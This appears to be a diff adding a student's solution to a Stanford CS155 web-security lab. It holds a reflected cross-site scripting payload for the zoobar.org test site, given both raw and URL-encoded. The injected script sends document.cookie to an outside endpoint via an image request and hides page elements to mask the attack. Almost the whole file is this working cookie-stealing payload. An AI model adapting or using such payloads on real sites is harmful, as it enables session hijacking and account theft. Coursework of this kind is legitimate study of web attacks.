@@ -1,0 +1,11 @@
+// Change your_email to whatever your email is.
+
+UNENCODED:
+http://zoobar.org/users.php?user=
+
+"><script>void((new Image()).src='http://crypto.stanford.edu/cs155/hw_and_proj/proj2/sendmail.php?'+'to=your_email@stanford.edu'+'&payload='+document.cookie+'&random='+Math.random());function init(){x=document.getElementById("zoobars");x.removeChild(x.childNodes[1]);x.removeChild(x.childNodes[1]);document.getElementById("baduser").style.visibility='hidden';document.getElementsByName("user")[0].size=10;}window.onload=init;</script><input style="display:none" value="
+
+ENCODED:
+http://zoobar.org/users.php?user=%22%3E%3Cscript%3Evoid%28%28new+Image%28%29%29.src%3D%27http%3A%2F%2Fcrypto.stanford.edu%2Fcs155%2Fhw_and_proj%2Fproj2%2Fsendmail.php%3F%27%2B%27to%3Dyour_email%40stanford.edu%27%2B%27%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%29%3Bfunction+init%28%29%7Bx%3Ddocument.getElementById%28%22zoobars%22%29%3Bx.removeChild%28x.childNodes%5B1%5D%29%3Bx.removeChild%28x.childNodes%5B1%5D%29%3Bdocument.getElementById%28%22baduser%22%29.style.visibility%3D%27hidden%27%3Bdocument.getElementsByName%28%22user%22%29%5B0%5D.size%3D10%3B%7Dwindow.onload%3Dinit%3B%3C%2Fscript%3E%3Cinput+style%3D%22display%3Anone%22+value%3D%22
+
+
